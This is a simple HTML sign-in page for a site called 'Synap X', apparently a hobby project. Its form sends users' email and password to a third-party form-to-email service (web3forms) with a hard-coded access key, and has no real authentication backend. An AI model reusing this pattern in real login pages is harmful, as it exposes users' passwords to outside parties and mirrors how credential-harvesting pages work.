<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Synap X - Sign Up</title>
    <link rel="stylesheet" href="signup.css">
</head>
<body>
    <header class="header">
        <div class="logo">
            <img src="logoc.png" alt="Logo" class="logo-image">
        </div>
        <div class="sign-in">
            <span>Dont have an account?</span>
            <a href="signup.html"><button>Sign up</button></a> 
        </div>
    </header>

    <div class="form-container">
        <h2>Sign In</h2>
        <form action="https://api.web3forms.com/submit" method="POST" id="contactForm">
            <input type="hidden" name="access_key" value="a95afa41-90c4-43c6-91b3-d1eeb39a5223" />
            
            <label for="email">Email Address</label>
            <input type="email" id="email" name="email" placeholder="Email@example.com" required>
    
            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Minimum 8 characters" required>
    
            <a href="/forgot-password" class="forgot-password-link">Forgot Password?</a> <!-- Forgot Password Link -->
    
            <button type="submit">Sign In</button>
        </form>
    </div>
    
    <style>
        .forgot-password-link {
            display: block;
            margin-top: 10px;
            font-size: 0.9em;
            color: #007bff;
            text-decoration: none;
        }
        .forgot-password-link:hover {
            text-decoration: underline;
        }
    </style>
    


</body>
</html>
